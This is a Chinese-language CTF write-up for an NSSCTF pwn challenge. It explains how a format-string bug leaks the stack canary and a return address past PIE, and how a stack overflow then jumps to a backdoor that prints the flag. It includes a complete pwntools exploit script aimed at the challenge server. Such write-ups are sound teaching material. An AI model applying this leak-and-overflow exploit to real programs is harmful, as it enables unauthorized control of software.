# 前言

最近学了格式化字符串的知识，而且想自己独立做一下pwn题，于是就找到了下面的一道题，比较简单

> https://www.nssctf.cn/problem/774

# 基本思路

IDA打开，能够很容易发现程序有一个后门函数,直接cat flag。找到关键漏洞处。

![image-20230713214323641](https://raw.githubusercontent.com/tgrddf55/tgrddf55.github.io/main/imgs/202307132143851.png)

先输入format，再打印这个format最后再输入。

前面是格式化字符串漏洞，后面是栈溢出漏洞。

但是程序保护全开，pie保护和栈溢出保护都需要想办法绕过。

pie保护开启了，我们再想通过栈溢出控制程序执行后门函数就没那么简单了，至少需要知道某个指令的地址。

canary保护的话需要能够泄露出rbp-8位置上的值。

格式化字符串漏洞都可以帮我们做到，只需要找到canary和ret地址相对于格式化字符串的位置就可以了。

# exp

```python
from pwn import *
#p=process('./find_flag')
p=remote('node4.anna.nssctf.cn',28795)
payload=b'AAAAAAAB%17$p%18$p%19$p'

p.sendlineafter('name? ',payload)

p.recvuntil('B')
cannary=eval(p.recv(18))
print(hex(cannary))
ret_addr=eval(p.recvuntil('!')[-15:-1])
print(hex(ret_addr))
backdoor=ret_addr-0x242
print(hex(backdoor))
payload2=b'a'*56+p64(cannary)+p64(cannary)+p64(backdoor)
p.sendlineafter('else? ',payload2)
p.interactive()

```

